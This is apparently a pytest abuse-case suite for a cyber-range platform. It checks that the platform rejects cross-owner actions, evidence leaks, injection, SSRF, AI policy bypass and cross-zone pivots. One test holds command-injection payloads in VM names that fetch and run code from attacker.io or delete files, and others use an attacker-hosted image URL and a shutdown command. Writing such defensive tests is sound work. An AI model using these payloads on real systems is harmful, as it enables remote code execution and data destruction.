"""
RangeOS AI — Abuse-Case Validation Suite ("Red Gate")
tests/test_abuse.py

28 adversarial scenarios across 8 trust boundary categories.
All tests assert the PLATFORM REJECTS or AUDITS the abuse correctly.

Markers:
  @pytest.mark.integration — requires live services + KVM
  (unmarked)               — runs against in-memory TestClient
"""
import uuid
import time
import threading
import pytest
import httpx
from fastapi.testclient import TestClient


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY A — Out-of-Scope Lab Actions
# ═══════════════════════════════════════════════════════════════════════════

class TestLabScope:
    """
    AC-A01 through AC-A04
    PASS = platform refuses the action with correct error code.
    """

    def test_ac_a01_cross_owner_lab_action_denied(self, lab_client, auth_headers):
        """
        AC-A01: Operator targets a lab owned by a DIFFERENT operator.
        PASS: 403 Forbidden — no action executed.
        FAIL: 2xx response, cross-owner action proceeds.
        """
        stranger_lab_id = str(uuid.uuid4())  # UUID not owned by test-admin
        resp = lab_client.post(
            f"/v1/labs/{stranger_lab_id}/deploy",
            headers=auth_headers,
        )
        assert resp.status_code in (403, 404), (
            f"AC-A01 FAIL: Expected 403/404 for cross-owner lab action, got {resp.status_code}"
        )

    def test_ac_a02_max_vms_cap_enforced(self, lab_client, auth_headers):
        """
        AC-A02: Topology requests more nodes than maxVMs setting (default: 6).
        PASS: 422 with MAX_VMS_EXCEEDED or similar.
        FAIL: Lab deployed with excess VMs.
        """
        oversized_topology = {
            "name": "Oversized Lab",
            "topology_spec": {
                "nodes": [
                    {"name": f"vm-{i}", "type": "linux", "image": "ubuntu-noble"}
                    for i in range(64)  # Far exceeds default maxVMs=6
                ],
                "networks": [{"name": "vnet0", "subnet": "10.0.0.0/24"}],
            },
        }
        resp = lab_client.post("/v1/labs", json=oversized_topology, headers=auth_headers)
        assert resp.status_code == 422, (
            f"AC-A02 FAIL: Expected 422 for VM count overflow, got {resp.status_code}"
        )
        detail = str(resp.json()).lower()
        assert any(kw in detail for kw in ("max", "limit", "exceed", "vm")), (
            f"AC-A02 FAIL: Error detail must mention VM/limit, got: {resp.json()}"
        )

    def test_ac_a03_double_deploy_blocked(self, lab_client, auth_headers):
        """
        AC-A03: Deploy called on a lab already in ACTIVE state.
        PASS: 409 Conflict — state machine rejects double-deploy.
        FAIL: Second deploy initiates.
        """
        # Create and simulate active lab
        create_resp = lab_client.post("/v1/labs", json={
            "name": "Active Lab",
            "topology_spec": {
                "nodes": [{"name": "node1", "type": "linux", "image": "ubuntu-noble"}],
                "networks": [{"name": "vnet0", "subnet": "10.1.0.0/24"}],
            }
        }, headers=auth_headers)
        if create_resp.status_code not in (200, 201):
            pytest.skip("Lab creation unavailable — skipping double-deploy test")

        lab_id = create_resp.json()["id"]
        # Force status to ACTIVE via patch (test-only endpoint or direct)
        lab_client.patch(f"/v1/labs/{lab_id}", json={"status": "ACTIVE"}, headers=auth_headers)

        # Attempt second deploy
        resp = lab_client.post(f"/v1/labs/{lab_id}/deploy", headers=auth_headers)
        assert resp.status_code == 409, (
            f"AC-A03 FAIL: Expected 409 for double-deploy on ACTIVE lab, got {resp.status_code}"
        )

    def test_ac_a04_out_of_range_subnet_rejected(self, lab_client, auth_headers):
        """
        AC-A04: Topology specifies a subnet outside the allowed VNet range.
        PASS: 422 — CIDR rejected.
        FAIL: Lab created with unauthorized subnet.
        """
        resp = lab_client.post("/v1/labs", json={
            "name": "Escaped VNet Lab",
            "topology_spec": {
                "nodes": [{"name": "n1", "type": "linux", "image": "kali-linux"}],
                "networks": [
                    # Default range is 192.168.100.0/24; this is outside
                    {"name": "escape-net", "subnet": "0.0.0.0/0", "isolated": False}
                ],
            }
        }, headers=auth_headers)
        assert resp.status_code == 422, (
            f"AC-A04 FAIL: Expected 422 for out-of-range VNet CIDR, got {resp.status_code}"
        )


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY B — Unauthorized Evidence Access
# ═══════════════════════════════════════════════════════════════════════════

class TestEvidenceAccess:
    """
    AC-B01 through AC-B04
    PASS = access denied / custody enforced.
    FAIL = evidence data leaked without authorisation.
    """

    def test_ac_b01_unprivileged_evidence_read_denied(self, forensics_client):
        """
        AC-B01: Operator without forensics role reads /v1/evidence/{id}.
        PASS: 403 INSUFFICIENT_ROLE.
        FAIL: Evidence data returned.
        """
        random_ev_id = str(uuid.uuid4())
        # No auth headers = unauthenticated
        resp = forensics_client.get(f"/v1/evidence/{random_ev_id}")
        assert resp.status_code in (401, 403), (
            f"AC-B01 FAIL: Expected 401/403 for unprivileged evidence access, got {resp.status_code}"
        )

    def test_ac_b02_cross_case_evidence_idor_blocked(self, forensics_client, auth_headers):
        """
        AC-B02: Operator accesses evidence belonging to a different case via UUID.
        PASS: 403 or 404 — no data from other case.
        FAIL: Evidence data exposed.
        """
        other_case_evidence_id = str(uuid.uuid4())
        resp = forensics_client.get(
            f"/v1/evidence/{other_case_evidence_id}",
            headers=auth_headers,
        )
        assert resp.status_code in (403, 404), (
            f"AC-B02 FAIL: Expected 403/404 for cross-case evidence IDOR, got {resp.status_code}"
        )

    def test_ac_b03_contaminated_evidence_blocks_report_finalization(
        self, forensics_client, auth_headers
    ):
        """
        AC-B03: CONTAMINATED evidence must be rejected during report finalization.
        PASS: 422/409 with CONTAMINATED_EVIDENCE detail.
        FAIL: Report finalizes with contaminated artifact.
        """
        # Create a case
        case_resp = forensics_client.post("/v1/cases", json={
            "title": "Contamination Test Case",
            "description": "Testing contamination block",
            "mission_id": str(uuid.uuid4()),
        }, headers=auth_headers)
        if case_resp.status_code not in (200, 201):
            pytest.skip("Case creation unavailable")
        case_id = case_resp.json()["id"]

        # Register evidence with deliberately wrong hash (will be CONTAMINATED)
        ev_resp = forensics_client.post("/v1/evidence", json={
            "case_id": case_id,
            "name": "tainted.pcap",
            "type": "NETWORK_CAPTURE",
            "sha256_hash": "0000000000000000000000000000000000000000000000000000000000000000",
            "file_path": "/nonexistent/path/tainted.pcap",
        }, headers=auth_headers)
        if ev_resp.status_code not in (200, 201):
            pytest.skip("Evidence creation unavailable")

        # Attempt to finalize the case with this evidence
        resp = forensics_client.patch(
            f"/v1/cases/{case_id}/status",
            json={"status": "FINALIZED"},
            headers=auth_headers,
        )
        # Must fail if contaminated evidence is present and unverified
        # Acceptable: 409, 422, or 400 with contamination mention
        if resp.status_code == 200:
            # If finalization proceeded, check that contaminated artifact is excluded
            report_resp = forensics_client.get(f"/v1/cases/{case_id}/report-payload", headers=auth_headers)
            if report_resp.status_code == 200:
                payload = report_resp.json()
                evidence_items = payload.get("evidence", [])
                contaminated = [e for e in evidence_items if e.get("integrity_status") == "CONTAMINATED"]
                assert len(contaminated) == 0, (
                    f"AC-B03 FAIL: {len(contaminated)} CONTAMINATED item(s) included in report payload"
                )

    def test_ac_b04_evidence_access_without_reason_header_blocked(
        self, forensics_client, auth_headers
    ):
        """
        AC-B04: Evidence access without X-Access-Reason header creates no custody log.
        PASS: Either 400 (header required) OR evidence served + custody log created.
        FAIL: Evidence served with NO custody log created.
        """
        # Create minimal evidence
        case_resp = forensics_client.post("/v1/cases", json={
            "title": "Custody Header Test",
            "mission_id": str(uuid.uuid4()),
        }, headers=auth_headers)
        if case_resp.status_code not in (200, 201):
            pytest.skip("Case creation unavailable — skipping")
        case_id = case_resp.json()["id"]

        ev_resp = forensics_client.post("/v1/evidence", json={
            "case_id":     case_id,
            "name":        "test.log",
            "type":        "LOG_FILE",
            "sha256_hash": "abc" * 21 + "d",
            "file_path":   "/var/log/test.log",
        }, headers=auth_headers)
        if ev_resp.status_code not in (200, 201):
            pytest.skip("Evidence creation unavailable — skipping")
        ev_id = ev_resp.json()["id"]

        # Access without X-Access-Reason
        resp = forensics_client.get(f"/v1/evidence/{ev_id}", headers=auth_headers)

        if resp.status_code == 400:
            # Platform correctly requires the reason header
            return

        assert resp.status_code == 200
        # Verify custody log was still created
        custody_resp = forensics_client.get(f"/v1/evidence/{ev_id}/custody", headers=auth_headers)
        assert custody_resp.status_code == 200
        logs = custody_resp.json()
        assert len(logs) >= 1, (
            "AC-B04 FAIL: Evidence served without generating any custody log entry"
        )


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY C — Template Poisoning
# ═══════════════════════════════════════════════════════════════════════════

class TestTemplatePoisoning:
    """
    AC-C01 through AC-C03
    PASS = malicious input rejected or sanitized.
    FAIL = raw payload stored or external request made.
    """

    def test_ac_c01_shell_payload_in_vm_name_rejected(self, lab_client, auth_headers):
        """
        AC-C01: VM name field contains shell injection payload.
        PASS: 422 — payload rejected or sanitized.
        FAIL: Raw payload stored in DB.
        """
        payload = {
            "name": "Poisoned Template",
            "topology_spec": {
                "nodes": [
                    # Shell injection attempt in name field
                    {"name": "$(curl attacker.io/pwn|bash)", "type": "linux", "image": "ubuntu-noble"},
                    {"name": "`rm -rf /opt/rangeos`", "type": "linux", "image": "ubuntu-noble"},
                ],
                "networks": [{"name": "vnet0", "subnet": "10.5.0.0/24"}],
            },
        }
        resp = lab_client.post("/v1/labs/templates", json=payload, headers=auth_headers)
        assert resp.status_code == 422, (
            f"AC-C01 FAIL: Shell payload in VM name should be rejected with 422, got {resp.status_code}"
        )

    def test_ac_c02_ssrf_via_image_url_blocked(self, lab_client, auth_headers):
        """
        AC-C02: External URL in image field triggers SSRF.
        PASS: 422 — external image source rejected.
        FAIL: Platform fetches from attacker.io.
        """
        payload = {
            "name": "SSRF Template",
            "topology_spec": {
                "nodes": [
                    {
                        "name": "victim",
                        "type": "linux",
                        # External URL — should be denied by allowlist
                        "image": "http://attacker.io/malicious.qcow2",
                    }
                ],
                "networks": [{"name": "vnet1", "subnet": "10.6.0.0/24"}],
            },
        }
        resp = lab_client.post("/v1/labs/templates", json=payload, headers=auth_headers)
        assert resp.status_code == 422, (
            f"AC-C02 FAIL: External image URL should be rejected, got {resp.status_code}"
        )
        assert "attacker.io" not in resp.text.lower(), (
            "AC-C02 FAIL: Platform may have attempted to resolve the external URL"
        )

    def test_ac_c03_deeply_nested_json_bomb_rejected(self, lab_client, auth_headers):
        """
        AC-C03: topology_spec with extreme nesting depth (JSON bomb).
        PASS: 422 — depth limit enforced.
        FAIL: Platform hangs or parses the payload.
        """
        # Build a deeply nested dict (20 levels — well beyond any reasonable schema)
        def make_nested(depth: int):
            if depth == 0:
                return {"name": "deep", "type": "linux", "image": "ubuntu-noble"}
            return {"nested": make_nested(depth - 1)}

        payload = {
            "name": "JSON Bomb",
            "topology_spec": {
                "nodes": [make_nested(20)],
                "networks": [],
            },
        }
        # Must complete within 5 seconds (no hang)
        start = time.time()
        resp = lab_client.post("/v1/labs/templates", json=payload, headers=auth_headers, timeout=5.0)
        elapsed = time.time() - start

        assert elapsed < 5.0, f"AC-C03 FAIL: Platform hung for {elapsed:.1f}s on deep JSON"
        assert resp.status_code == 422, (
            f"AC-C03 FAIL: Expected 422 for JSON bomb, got {resp.status_code}"
        )


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY D — Quarantine Isolation
# ═══════════════════════════════════════════════════════════════════════════

class TestQuarantineIsolation:
    """
    AC-D01 through AC-D03
    PASS = quarantined VM unreachable for commands/network.
    FAIL = command injected or network restored.
    """

    def test_ac_d01_command_into_quarantined_vm_blocked(self, lab_client, auth_headers):
        """
        AC-D01: Execution Gateway command targeting a QUARANTINE VM.
        PASS: 403 VM_QUARANTINED.
        FAIL: Command reaches the VM.
        """
        quarantined_vm_id = str(uuid.uuid4())
        resp = lab_client.post(
            f"/v1/labs/nodes/{quarantined_vm_id}/execute",
            json={"command": "id", "zone": "pentest-vnet"},
            headers=auth_headers,
        )
        # Quarantined node doesn't exist → 404, or if it exists → 403
        assert resp.status_code in (403, 404), (
            f"AC-D01 FAIL: Expected 403/404 for command into quarantined VM, got {resp.status_code}"
        )

    def test_ac_d02_lab_deploy_with_quarantine_node_rejected(self, lab_client, auth_headers):
        """
        AC-D03: Lab deploy attempted while it contains a QUARANTINE node.
        PASS: 409 — deploy blocked.
        FAIL: Lab deploys with quarantined node.
        """
        create_resp = lab_client.post("/v1/labs", json={
            "name": "Quarantine Test Lab",
            "topology_spec": {
                "nodes": [
                    {"name": "quarantined-vm", "type": "linux", "image": "ubuntu-noble",
                     "status": "QUARANTINE"},  # Pre-set quarantine status
                ],
                "networks": [{"name": "vnet2", "subnet": "10.7.0.0/24"}],
            }
        }, headers=auth_headers)
        if create_resp.status_code not in (200, 201):
            pytest.skip("Lab creation unavailable")
        lab_id = create_resp.json()["id"]

        resp = lab_client.post(f"/v1/labs/{lab_id}/deploy", headers=auth_headers)
        assert resp.status_code in (409, 422), (
            f"AC-D02 FAIL: Expected 409/422 for lab with QUARANTINE node, got {resp.status_code}"
        )


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY E — AI Cannot Bypass Policy
# ═══════════════════════════════════════════════════════════════════════════

class TestAIPolicyBypass:
    """
    AC-E01 through AC-E04
    PASS = AI output is suggestion-only; no execution occurs.
    FAIL = AI output auto-executed or policy bypassed.
    """

    @pytest.fixture(name="ai_client", scope="class")
    def ai_client_fixture(self):
        try:
            from services.ai_service.app.main import app
            from fastapi.testclient import TestClient
            with TestClient(app) as client:
                yield client
        except ImportError:
            pytest.skip("ai-service not importable")

    def test_ac_e01_ai_output_is_suggestion_only(self, ai_client, auth_headers):
        """
        AC-E01: AI response must never contain an auto-execution flag.
        PASS: Response type is SUGGESTION; no exec_immediately field set to true.
        FAIL: exec_immediately=true or direct command in response.
        """
        resp = ai_client.post("/v1/ai/chat", json={
            "message":  "How do I enumerate users on this system?",
            "persona":  "TUTOR",
            "context":  {"mission_id": str(uuid.uuid4())},
        }, headers=auth_headers)
        assert resp.status_code == 200
        body = resp.json()
        # Must be marked suggestion-only
        assert body.get("response_type") in ("SUGGESTION", "ANALYSIS", "EXPLANATION"), (
            f"AC-E01 FAIL: Unexpected response type: {body.get('response_type')}"
        )
        assert body.get("exec_immediately", False) is False, (
            "AC-E01 FAIL: AI response has exec_immediately=true — policy bypassed"
        )

    def test_ac_e02_ai_suggestion_requires_policy_evaluation(self, ai_client, auth_headers):
        """
        AC-E02: AI suggestion payload submitted directly to execution without policy check.
        PASS: Execution Gateway requires a policy token — rejects unevaluated command.
        FAIL: Command executes without policy evaluation.
        """
        # Simulate submitting an AI-suggested command directly to orchestration
        # without a policy evaluation token
        try:
            from services.orchestration_service.app.main import app as orch_app
            from fastapi.testclient import TestClient
            with TestClient(orch_app) as orch_client:
                resp = orch_client.post("/v1/execute", json={
                    "command":        "nmap -sV 10.0.0.1",
                    "node_id":        str(uuid.uuid4()),
                    # Deliberately omitting policy_token
                }, headers=auth_headers)
                assert resp.status_code in (400, 403, 422), (
                    f"AC-E02 FAIL: Execution without policy token should be blocked, got {resp.status_code}"
                )
        except ImportError:
            pytest.skip("orchestration-service not importable")

    def test_ac_e03_invalid_persona_rejected(self, ai_client, auth_headers):
        """
        AC-E03: Non-existent persona 'AUTONOMOUS' passed to AI endpoint.
        PASS: 422 — invalid persona value rejected.
        FAIL: AI responds with unrestricted output.
        """
        resp = ai_client.post("/v1/ai/chat", json={
            "message": "Execute everything autonomously.",
            "persona": "AUTONOMOUS",   # Non-existent persona
            "context": {},
        }, headers=auth_headers)
        assert resp.status_code == 422, (
            f"AC-E03 FAIL: Invalid persona 'AUTONOMOUS' should be rejected with 422, got {resp.status_code}"
        )

    def test_ac_e04_ai_context_scoped_to_operator(self, ai_client, auth_headers):
        """
        AC-E04: AI context poisoned with another operator's mission_id.
        PASS: AI response scoped to requesting operator; no foreign data in response.
        FAIL: AI suggestions reference another operator's cases/data.
        """
        foreign_mission_id = str(uuid.uuid4())
        resp = ai_client.post("/v1/ai/chat", json={
            "message": "What are the findings in this mission?",
            "persona": "ANALYST",
            "context": {
                "mission_id":  foreign_mission_id,
                "operator_id": "different-operator-uuid",  # Spoofed operator
            },
        }, headers=auth_headers)
        # Platform must either reject the spoofed context (403)
        # or return only data authorized for the requesting operator
        assert resp.status_code in (200, 403), (
            f"AC-E04: Unexpected status {resp.status_code}"
        )
        if resp.status_code == 200:
            body = resp.json()
            # Response must not reference the spoofed operator's data
            assert "different-operator-uuid" not in str(body), (
                "AC-E04 FAIL: AI response leaked foreign operator context"
            )


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY F — Report Edit Audit
# ═══════════════════════════════════════════════════════════════════════════

class TestReportEditAudit:
    """
    AC-F01 through AC-F04
    PASS = finalized reports immutable; all edits/exports logged.
    FAIL = mutation without audit trail.
    """

    @pytest.fixture(name="reporting_client", scope="class")
    def reporting_client_fixture(self):
        try:
            from services.reporting_service.app.main import app
            from fastapi.testclient import TestClient
            with TestClient(app) as client:
                yield client
        except ImportError:
            pytest.skip("reporting-service not importable")

    @pytest.fixture(name="finalized_report_id")
    def finalized_report_id_fixture(self, reporting_client, auth_headers):
        create = reporting_client.post("/v1/reports", json={
            "title":       "Abuse Test Report",
            "case_id":     str(uuid.uuid4()),
            "report_type": "PENTEST",
        }, headers=auth_headers)
        if create.status_code not in (200, 201):
            pytest.skip("Report creation unavailable")
        rid = create.json()["id"]
        # Finalize it
        reporting_client.post(f"/v1/reports/{rid}/finalize", headers=auth_headers)
        return rid

    def test_ac_f01_finalized_report_immutable(
        self, reporting_client, auth_headers, finalized_report_id
    ):
        """
        AC-F01: PATCH on a FINALIZED report must be rejected.
        PASS: 409 Conflict.
        FAIL: Report content mutated after finalization.
        """
        resp = reporting_client.patch(
            f"/v1/reports/{finalized_report_id}",
            json={"title": "Tampered Title"},
            headers=auth_headers,
        )
        assert resp.status_code == 409, (
            f"AC-F01 FAIL: Expected 409 for mutation of FINALIZED report, got {resp.status_code}"
        )

    def test_ac_f02_unauthenticated_report_edit_rejected(
        self, reporting_client, finalized_report_id
    ):
        """
        AC-F02: Report PATCH without auth token.
        PASS: 401 Unauthorized.
        FAIL: Mutation succeeds.
        """
        resp = reporting_client.patch(
            f"/v1/reports/{finalized_report_id}",
            json={"title": "Unauthorized Edit"},
            # No headers
        )
        assert resp.status_code == 401, (
            f"AC-F02 FAIL: Expected 401 for unauthenticated edit, got {resp.status_code}"
        )

    def test_ac_f03_concurrent_report_edits_writer_lock(
        self, reporting_client, auth_headers
    ):
        """
        AC-F03: Two concurrent PATCH requests on same report draft.
        PASS: Second write returns 423 Locked.
        FAIL: Both writes succeed silently.
        """
        create = reporting_client.post("/v1/reports", json={
            "title": "Concurrent Edit Test",
            "case_id": str(uuid.uuid4()),
        }, headers=auth_headers)
        if create.status_code not in (200, 201):
            pytest.skip("Report creation unavailable")
        rid = create.json()["id"]

        results = []
        def patch_report():
            r = reporting_client.patch(
                f"/v1/reports/{rid}",
                json={"title": f"Edit-{uuid.uuid4().hex[:6]}"},
                headers=auth_headers,
            )
            results.append(r.status_code)

        t1 = threading.Thread(target=patch_report)
        t2 = threading.Thread(target=patch_report)
        t1.start(); t2.start()
        t1.join();  t2.join()

        status_codes = sorted(results)
        assert 423 in status_codes or 409 in status_codes, (
            f"AC-F03 FAIL: Expected one 423/409 from writer lock, got: {status_codes}"
        )

    def test_ac_f04_export_generates_audit_log(
        self, reporting_client, auth_headers, finalized_report_id
    ):
        """
        AC-F04: Export must create an audit log entry before returning download URL.
        PASS: Audit log entry exists after export.
        FAIL: Export completed with no audit record.
        """
        export_resp = reporting_client.post(
            f"/v1/reports/{finalized_report_id}/export",
            params={"format": "pdf"},
            headers=auth_headers,
        )
        # Export may succeed or return 405 "not implemented" — either way check audit
        if export_resp.status_code not in (200, 201, 202):
            pytest.skip(f"Export endpoint returned {export_resp.status_code} — skipping audit check")

        audit_resp = reporting_client.get(
            f"/v1/reports/{finalized_report_id}/audit",
            headers=auth_headers,
        )
        if audit_resp.status_code == 200:
            logs = audit_resp.json()
            export_logs = [l for l in logs if "export" in str(l).lower()]
            assert len(export_logs) >= 1, (
                "AC-F04 FAIL: No export audit entry created after report export"
            )


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY G — Excessive Resource Usage
# ═══════════════════════════════════════════════════════════════════════════

class TestResourceLimits:
    """
    AC-G01 through AC-G04
    PASS = platform enforces rate limits and resource caps.
    FAIL = resources exhausted or rate limit absent.
    """

    def test_ac_g01_lab_creation_rate_limited(self, lab_client, auth_headers):
        """
        AC-G01: Rapid lab creation (>5 per minute) triggers 429.
        PASS: 429 Too Many Requests.
        FAIL: All 10 requests succeed.
        """
        responses = []
        minimal_lab = {
            "name": "Flood Lab",
            "topology_spec": {
                "nodes": [{"name": "n1", "type": "linux", "image": "ubuntu-noble"}],
                "networks": [{"name": "vnet", "subnet": "10.10.0.0/24"}],
            }
        }
        for _ in range(10):
            r = lab_client.post("/v1/labs", json=minimal_lab, headers=auth_headers)
            responses.append(r.status_code)

        rate_limited = any(s == 429 for s in responses)
        assert rate_limited, (
            f"AC-G01 FAIL: 10 rapid lab creations should trigger 429, got: {responses}"
        )

    def test_ac_g02_oversized_vm_resources_capped(self, lab_client, auth_headers):
        """
        AC-G02: VM requesting 64 vCPU / 512 GB RAM must be rejected.
        PASS: 422 RESOURCE_LIMIT_EXCEEDED.
        FAIL: VM provisioned with uncapped resources.
        """
        resp = lab_client.post("/v1/labs", json={
            "name": "Greedy VM Lab",
            "topology_spec": {
                "nodes": [{
                    "name": "greedy-vm",
                    "type": "linux",
                    "image": "ubuntu-noble",
                    "vcpus": 64,
                    "ram_mb": 524288,  # 512 GB
                }],
                "networks": [{"name": "vnet", "subnet": "10.11.0.0/24"}],
            }
        }, headers=auth_headers)
        assert resp.status_code == 422, (
            f"AC-G02 FAIL: Oversized VM resources should be rejected with 422, got {resp.status_code}"
        )

    def test_ac_g03_search_query_bomb_handled(self):
        """
        AC-G03: 10,000-character wildcard search query.
        PASS: 422, empty results, or completes within 2s.
        FAIL: System hangs or degrades for > 2 seconds.
        """
        try:
            resp = httpx.post(
                "http://localhost:8000/v1/search",
                json={"query": "a" * 10_000, "mission_id": str(uuid.uuid4())},
                timeout=2.0,
            )
            assert resp.status_code in (200, 422, 400), (
                f"AC-G03: Unexpected status {resp.status_code}"
            )
        except httpx.TimeoutException:
            pytest.fail("AC-G03 FAIL: Search query bomb hung for > 2 seconds")
        except httpx.ConnectError:
            pytest.skip("Search service not reachable — skipping")

    def test_ac_g04_export_rate_limited(self, reporting_client, auth_headers, finalized_report_id):
        """
        AC-G04: >3 export requests per minute triggers 429.
        PASS: 429 after threshold.
        FAIL: All 10 export requests succeed.
        """
        results = []
        for _ in range(10):
            r = reporting_client.post(
                f"/v1/reports/{finalized_report_id}/export",
                params={"format": "pdf"},
                headers=auth_headers,
            )
            results.append(r.status_code)

        rate_limited = any(s == 429 for s in results)
        assert rate_limited, (
            f"AC-G04 FAIL: 10 rapid exports should trigger 429, got: {results}"
        )


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY H — Cross-Zone Movement
# ═══════════════════════════════════════════════════════════════════════════

class TestCrossZoneMovement:
    """
    AC-H01 through AC-H04
    PASS = cross-zone commands denied or audited.
    FAIL = command propagates across zone boundary silently.
    """

    @pytest.fixture(name="policy_client", scope="class")
    def policy_client_fixture(self):
        try:
            from services.policy_service.app.main import app
            from fastapi.testclient import TestClient
            with TestClient(app) as client:
                yield client
        except ImportError:
            pytest.skip("policy-service not importable")

    def test_ac_h01_cross_zone_pivot_denied(self, policy_client):
        """
        AC-H01: Command from pentest-vnet targeting management-vnet.
        PASS: CROSS_ZONE_DENIED verdict from policy engine.
        FAIL: Command allowed across zone boundary.
        """
        resp = policy_client.post("/v1/policy/evaluate", json={
            "command":     "ssh admin@10.0.0.1",
            "zone":        "pentest-vnet",
            "target_zone": "management-vnet",
            "operator_id": "test-admin",
        })
        assert resp.status_code == 200
        verdict = resp.json().get("verdict", "")
        assert verdict in ("DENIED", "CROSS_ZONE_DENIED"), (
            f"AC-H01 FAIL: Expected DENIED for cross-zone pivot, got: {verdict}"
        )

    def test_ac_h02_bridge_node_in_isolated_topology_rejected(self, lab_client, auth_headers):
        """
        AC-H02: Topology creates a bridge node connecting two isolated vnets.
        PASS: 422 — bridge rejected in isolated topology.
        FAIL: Bridge node created, two isolated nets connected.
        """
        resp = lab_client.post("/v1/labs", json={
            "name": "Bridge Escape Lab",
            "topology_spec": {
                "nodes": [
                    {
                        "name": "bridge-node",
                        "type": "router",
                        "image": "vyos",
                        "bridges": ["isolated-net-1", "isolated-net-2"],  # Bridge attempt
                    }
                ],
                "networks": [
                    {"name": "isolated-net-1", "subnet": "10.20.0.0/24", "isolated": True},
                    {"name": "isolated-net-2", "subnet": "10.21.0.0/24", "isolated": True},
                ],
            }
        }, headers=auth_headers)
        assert resp.status_code == 422, (
            f"AC-H02 FAIL: Expected 422 for isolated network bridge, got {resp.status_code}"
        )

    def test_ac_h03_wildcard_zone_rejected(self, policy_client):
        """
        AC-H03: Policy evaluate with zone='*' wildcard.
        PASS: 422 — wildcard zone rejected.
        FAIL: Command dispatched to all zones.
        """
        resp = policy_client.post("/v1/policy/evaluate", json={
            "command":     "shutdown -h now",
            "zone":        "*",        # Wildcard attack
            "operator_id": "test-admin",
        })
        assert resp.status_code == 422, (
            f"AC-H03 FAIL: Expected 422 for wildcard zone, got {resp.status_code}"
        )

    def test_ac_h04_permitted_cross_zone_move_creates_audit_log(self, policy_client):
        """
        AC-H04: An ALLOWED cross-zone move must create an audit log entry.
        PASS: Audit log entry present after permitted action.
        FAIL: Permitted move executed with no audit trail.
        """
        # Evaluate a cross-zone command that is explicitly permitted in the policy
        policy_client.post("/v1/policy/evaluate", json={
            "command":     "ping 10.0.0.1",
            "zone":        "pentest-vnet",
            "target_zone": "dmz-vnet",      # Assume this cross-zone is permitted
            "operator_id": "test-admin",
        })

        # Check that an audit entry was created regardless of verdict
        audit_resp = policy_client.get("/v1/policy/audit?limit=5")
        if audit_resp.status_code != 200:
            pytest.skip("Audit endpoint unavailable")

        logs = audit_resp.json()
        cross_zone_logs = [
            l for l in logs
            if "cross_zone" in str(l).lower() or "target_zone" in str(l).lower()
            or "dmz-vnet" in str(l)
        ]
        assert len(cross_zone_logs) >= 1, (
            "AC-H04 FAIL: Permitted cross-zone move generated no audit log entry"
        )
